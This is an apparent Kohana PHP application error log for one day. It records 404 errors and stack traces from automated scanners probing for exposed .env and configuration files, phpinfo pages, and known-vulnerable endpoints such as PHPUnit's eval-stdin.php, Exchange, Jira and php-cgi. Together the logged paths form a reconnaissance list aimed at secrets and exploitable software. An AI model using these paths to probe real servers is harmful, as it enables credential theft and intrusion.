2025-10-24 05:12:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:43:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:43:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 06:47:39 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 06:47:39 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 06:54:49 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 06:54:49 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 06:57:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/logon.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 06:57:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/logon.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Media/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Media/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Demo/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Demo/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: items/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: items/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: club/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: club/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owncloud/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owncloud/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: twilio/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: twilio/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: products/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: products/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:20:53 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL info/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 07:20:53 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL info/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 07:20:55 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 07:20:55 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 07:20:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:20:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/public/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/public/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/.env.production ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/.env.production ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/phpinfo.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/phpinfo.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: functions/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: functions/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:07 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 07:21:07 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 07:21:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 07:21:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: static/historypage.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 07:21:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: static/historypage.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 08:12:22 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 08:12:22 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 08:34:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _profiler/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 08:34:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _profiler/phpinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 08:42:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 08:42:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:01:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:01:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:02:11 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:02:11 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:27 --- ERROR: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
2025-10-24 09:40:27 --- STRACE: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
--
#0 /var/www/html/application/classes/controller/api.php(50): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 50, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-24 09:40:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 09:40:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql/api was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 09:40:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webjars/swagger-ui/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/v1/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:39 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:39 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 09:40:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 09:40:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 09:40:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 09:40:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
